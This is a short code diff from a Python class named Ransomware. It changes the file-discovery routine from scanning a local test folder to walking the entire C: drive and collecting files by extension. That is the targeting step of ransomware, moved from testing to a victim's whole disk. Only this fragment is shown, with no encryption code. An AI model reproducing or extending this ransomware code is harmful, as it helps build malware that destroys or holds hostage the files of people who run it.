@@ -34,7 +34,7 @@ class Ransomware:
 
     def get_files(self) -> list:
         result = []
-        for root, _, files in os.walk('/home/nake/Documents/Wordlists/'):
+        for root, _, files in os.walk('C://'):
             for file in files:
                 if file.endswith(file_extension):
                     result.append(os.path.join(root, file))
